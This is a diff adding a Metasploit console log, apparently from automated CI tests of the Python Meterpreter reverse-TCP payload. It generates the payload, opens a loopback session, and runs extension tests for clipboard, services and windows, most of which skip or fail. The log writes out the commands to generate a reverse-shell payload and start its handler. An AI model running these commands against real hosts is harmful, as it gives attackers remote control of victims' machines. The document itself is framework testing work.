@@ -1,0 +1,41 @@
+use python/meterpreter_reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5252-p4igz5txt
+msf6 payload(python/meterpreter_reverse_tcp) > msf6 payload(python/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5252-p4igz5txt
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5252-8cm1ds.py -f raw AutoVerifySessionTimeout=30 lport=6010 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/pythonmeterpreter_reverse_tcp_debug_log20231026-5252-ujqs02txt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Writing 24928 bytes to D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5252-8cm1ds.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 9
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6010 
+[*] Meterpreter session 10 opened (127.0.0.1:6010 -> 127.0.0.1:50110) at 2023-10-26 19:04:58 +0000
+use test/extapi
+msf6 post(test/extapi) > run session=10 AddEntropy=true Verbose=true
+[*] Loading extapi extension...
+[*] This module is only available in a windows meterpreter session.
+[*] Running against session 10
+[*] Session type is meterpreter and platform is windows
+[*] Starting clipboard management tests
+[*] SKIPPED: should return an array of clipboard data (session does not support COMMAND_ID_EXTAPI_CLIPBOARD_GET_DATA)
+[-] [should return clipboard jpg dimensions] FAILED: should return clipboard jpg dimensions
+[-] [should return clipboard jpg dimensions] Exception: NoMethodError: undefined method `clipboard' for nil:NilClass
+[*] SKIPPED: should set clipboard text (session does not support COMMAND_ID_EXTAPI_CLIPBOARD_SET_DATA)
+[*] SKIPPED: should download clipboard text data (session does not support COMMAND_ID_EXTAPI_CLIPBOARD_SET_DATA)
+[-] [should download clipboard jpg data] FAILED: should download clipboard jpg data
+[-] [should download clipboard jpg data] Exception: NoMethodError: undefined method `clipboard' for nil:NilClass
+[*] Starting service management tests
+[*] SKIPPED: should return an array of services (session does not support COMMAND_ID_EXTAPI_SERVICE_ENUM)
+[*] SKIPPED: should return service information (session does not support COMMAND_ID_EXTAPI_SERVICE_QUERY)
+[*] Starting desktop windows management tests
+[*] SKIPPED: should return an array of windows (session does not support COMMAND_ID_EXTAPI_WINDOW_ENUM)
+[*] SKIPPED: should return an array including unknown windows (session does not support COMMAND_ID_EXTAPI_WINDOW_ENUM)
+[*] SKIPPED: should return an array of a windows children (session does not support COMMAND_ID_EXTAPI_WINDOW_ENUM)
+[*] Testing complete in 0.1 seconds
+[-] Passed: 8; Failed: 2; Skipped: 8
+[*] Post module execution completed
+sessions -K
+msf6 post(test/extapi) > jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 10 closed.
+msf6 post(test/extapi) > Stopping all jobs...
